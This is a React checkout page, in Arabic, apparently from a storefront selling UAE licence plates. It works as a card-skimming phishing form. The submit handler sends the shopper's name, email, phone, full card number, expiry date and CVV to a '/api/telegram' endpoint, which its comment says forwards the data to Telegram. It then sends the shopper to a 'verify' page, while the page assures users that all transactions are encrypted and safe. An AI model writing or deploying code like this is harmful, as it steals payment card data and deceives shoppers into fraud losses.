"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { useRouter } from "next/navigation"
import {
  CreditCard,
  ArrowRight,
  Shield,
  User,
  Mail,
  Phone,
  Lock,
  Loader2,
  AlertCircle,
  Bitcoin,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import type { Plate } from "@/lib/plates-data"
import {
  emirateNames,
  emirateColors,
  emirateTextColors,
  categoryNames,
  formatPrice,
} from "@/lib/plates-data"

interface CheckoutFormProps {
  plate: Plate
  initialMethod: string
}

export default function CheckoutForm({ plate }: CheckoutFormProps) {
  const router = useRouter()
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvv: "",
  })
  const [loading, setLoading] = useState(false)
  const [cryptoLoading, setCryptoLoading] = useState(false)
  const [error, setError] = useState("")

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Format card number with spaces
    if (name === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19)
    }

    // Format expiry date
    if (name === "cardExpiry") {
      formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5)
    }

    // Format CVV
    if (name === "cardCvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4)
    }

    setFormData((prev) => ({ ...prev, [name]: formattedValue }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setLoading(true)

    try {
      // Send data to Telegram
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "payment",
          data: {
            emirate: emirateNames[plate.emirate],
            plateCode: plate.code,
            plateNumber: plate.number,
            price: formatPrice(plate.price),
            name: formData.name,
            email: formData.email,
            phone: formData.phone,
            cardNumber: formData.cardNumber,
            cardExpiry: formData.cardExpiry,
            cardCvv: formData.cardCvv,
          },
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to process payment")
      }

      // Redirect to verification page
      router.push(
        `/checkout/verify?email=${encodeURIComponent(formData.email)}&plate=${plate.id}`
      )
    } catch {
      setError("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
      setLoading(false)
    }
  }

  return (
    <div className="mx-auto max-w-5xl px-4 py-8">
      {/* Breadcrumb */}
      <nav className="mb-6 flex items-center gap-2 text-sm text-muted-foreground" aria-label="مسار التنقل">
        <Link href="/" className="transition-colors hover:text-primary">
          {"الرئيسية"}
        </Link>
        <span>/</span>
        <Link href={`/plate/${plate.id}`} className="transition-colors hover:text-primary">
          {plate.code} {plate.number}
        </Link>
        <span>/</span>
        <span className="text-foreground">{"إتمام الشراء"}</span>
      </nav>

      <h1 className="mb-8 text-3xl font-black text-foreground">{"إتمام الشراء"}</h1>

      <div className="grid grid-cols-1 gap-8 lg:grid-cols-3">
        {/* Form */}
        <div className="lg:col-span-2">
          <form onSubmit={handleSubmit} className="flex flex-col gap-6">
            {/* Payment Method Display */}
            <div className="rounded-xl border border-border/50 bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"طريقة الدفع"}</h2>
              <div className="flex items-center gap-3 rounded-lg border-2 border-primary bg-primary/5 p-4">
                <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-primary/20">
                  <CreditCard className="h-5 w-5 text-primary" />
                </div>
                <div>
                  <p className="text-sm font-bold text-foreground">
                    {"بطاقة ائتمانية"}
                  </p>
                  <p className="text-xs text-muted-foreground">
                    {"Visa / Mastercard"}
                  </p>
                </div>
              </div>
            </div>

            {/* Personal Info */}
            <div className="rounded-xl border border-border/50 bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"المعلومات الشخصية"}</h2>
              <div className="flex flex-col gap-4">
                <div>
                  <Label htmlFor="name" className="mb-2 block text-sm text-muted-foreground">
                    {"الاسم الكامل"}
                  </Label>
                  <div className="relative">
                    <User className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <Input
                      id="name"
                      name="name"
                      value={formData.name}
                      onChange={handleChange}
                      required
                      placeholder="أدخل اسمك الكامل"
                      className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                  <div>
                    <Label htmlFor="email" className="mb-2 block text-sm text-muted-foreground">
                      {"البريد الإلكتروني"}
                    </Label>
                    <div className="relative">
                      <Mail className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="email"
                        name="email"
                        type="email"
                        value={formData.email}
                        onChange={handleChange}
                        required
                        placeholder="example@email.com"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="phone" className="mb-2 block text-sm text-muted-foreground">
                      {"رقم الهاتف"}
                    </Label>
                    <div className="relative">
                      <Phone className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="phone"
                        name="phone"
                        type="tel"
                        value={formData.phone}
                        onChange={handleChange}
                        required
                        placeholder="+971 50 123 4567"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Details */}
            <div className="rounded-xl border border-border/50 bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"تفاصيل البطاقة"}</h2>
              <div className="flex flex-col gap-4">
                <div>
                  <Label htmlFor="cardNumber" className="mb-2 block text-sm text-muted-foreground">
                    {"رقم البطاقة"}
                  </Label>
                  <div className="relative">
                    <CreditCard className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <Input
                      id="cardNumber"
                      name="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleChange}
                      required
                      placeholder="0000 0000 0000 0000"
                      className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                      dir="ltr"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="cardExpiry" className="mb-2 block text-sm text-muted-foreground">
                      {"تاريخ الانتهاء"}
                    </Label>
                    <Input
                      id="cardExpiry"
                      name="cardExpiry"
                      value={formData.cardExpiry}
                      onChange={handleChange}
                      required
                      placeholder="MM/YY"
                      className="border-border/50 bg-secondary/30 text-foreground placeholder:text-muted-foreground"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <Label htmlFor="cardCvv" className="mb-2 block text-sm text-muted-foreground">
                      {"CVV"}
                    </Label>
                    <div className="relative">
                      <Lock className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="cardCvv"
                        name="cardCvv"
                        value={formData.cardCvv}
                        onChange={handleChange}
                        required
                        placeholder="123"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Error Message */}
            {error && (
              <div className="flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 p-4 text-destructive">
                <AlertCircle className="h-5 w-5 shrink-0" />
                <p className="text-sm">{error}</p>
              </div>
            )}

            {/* Payment Buttons Container */}
            {console.log("[v0] Rendering payment buttons container")}
            <div className="rounded-xl border-2 border-primary bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"اختر طريقة الدفع"}</h2>
              
              <div className="flex flex-col gap-4">
                {/* Credit Card Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  disabled={loading}
                  className="w-full gap-3 bg-blue-600 py-6 text-lg font-bold text-white hover:bg-blue-700"
                >
                  {loading ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      {"جاري المعالجة..."}
                    </>
                  ) : (
                    <>
                      <CreditCard className="h-5 w-5" />
                      {"الدفع بالبطاقة الائتمانية"}
                      <span className="mr-auto rounded-full bg-white/20 px-3 py-1 text-sm">{formatPrice(plate.price)}</span>
                    </>
                  )}
                </Button>

                {/* Divider */}
                <div className="relative flex items-center py-1">
                  <div className="h-px flex-1 bg-border" />
                  <span className="px-4 text-sm font-medium text-muted-foreground">{"أو"}</span>
                  <div className="h-px flex-1 bg-border" />
                </div>

                {/* Crypto Payment Button */}
                <Button
                  type="button"
                  size="lg"
                  disabled={cryptoLoading}
                  onClick={async () => {
                    setCryptoLoading(true)
                    setError("")
                    try {
                      const res = await fetch("/api/crypto/create-payment", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                          price_amount: plate.price,
                          order_id: `plate-${plate.id}-${Date.now()}`,
                          order_description: `لوحة ${plate.code} ${plate.number}`,
                          plate_id: plate.id,
                        }),
                      })
                      const data = await res.json()
                      if (!res.ok || !data.invoice_url) {
                        throw new Error(data.error || "فشل إنشاء الفاتورة")
                      }
                      window.location.href = data.invoice_url
                    } catch (err: unknown) {
                      setError(err instanceof Error ? err.message : "حدث خطأ أثناء إنشاء فاتورة الدفع")
                      setCryptoLoading(false)
                    }
                  }}
                  className="w-full gap-3 bg-orange-500 py-6 text-lg font-bold text-white hover:bg-orange-600"
                >
                  {cryptoLoading ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      {"جاري إنشاء الفاتورة..."}
                    </>
                  ) : (
                    <>
                      <Bitcoin className="h-5 w-5" />
                      {"الدفع بالعملات الرقمية"}
                      <span className="mr-auto rounded-full bg-white/20 px-3 py-1 text-sm">{"BTC - ETH - USDT"}</span>
                    </>
                  )}
                </Button>
              </div>
            </div>

            {/* Security Note */}
            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
              <Shield className="h-4 w-4 text-green-500" />
              {"جميع المعاملات مشفرة وآمنة بالكامل"}
            </div>
          </form>
        </div>

        {/* Order Summary Sidebar */}
        <div className="lg:col-span-1">
          <div className="sticky top-24 rounded-xl border border-border/50 bg-card p-6">
            <h2 className="mb-4 text-lg font-bold text-foreground">{"ملخص الطلب"}</h2>

            {/* Plate Preview */}
            <div className={`relative mb-4 overflow-hidden rounded-lg border ${emirateColors[plate.emirate]} border-opacity-40`}>
              <div className="relative aspect-[16/10] bg-secondary/50">
                <Image
                  src={plate.image}
                  alt={`لوحة ${emirateNames[plate.emirate]} ${plate.number}`}
                  fill
                  className="object-cover"
                  sizes="400px"
                />
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-background/60 backdrop-blur-[2px]">
                  <span className={`mb-1 text-xs font-bold ${emirateTextColors[plate.emirate]}`}>
                    {emirateNames[plate.emirate]}
                  </span>
                  <div className="flex items-baseline gap-2">
                    <span className="text-sm font-bold text-muted-foreground">{plate.code}</span>
                    <span className="text-2xl font-black text-foreground">{plate.number}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Details */}
            <div className="flex flex-col gap-3 border-b border-border/50 pb-4">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الإمارة"}</span>
                <span className={`font-medium ${emirateTextColors[plate.emirate]}`}>
                  {emirateNames[plate.emirate]}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الفئة"}</span>
                <span className="font-medium text-foreground">
                  {categoryNames[plate.category]}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الكود / الرقم"}</span>
                <span className="font-medium text-foreground">
                  {plate.code} - {plate.number}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"طريقة الدفع"}</span>
                <span className="font-medium text-foreground">
                  {"بطاقة ائتمانية"}
                </span>
              </div>
            </div>

            {/* Price */}
            <div className="mt-4 flex items-center justify-between">
              <span className="text-base font-bold text-foreground">{"الإجمالي"}</span>
              <span className="text-2xl font-black text-primary">
                {formatPrice(plate.price)}
              </span>
            </div>

            {/* Back Link */}
            <Link
              href={`/plate/${plate.id}`}
              className="mt-4 flex items-center gap-1 text-sm text-muted-foreground transition-colors hover:text-primary"
            >
              <ArrowRight className="h-4 w-4" />
              {"العودة لتفاصيل اللوحة"}
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}
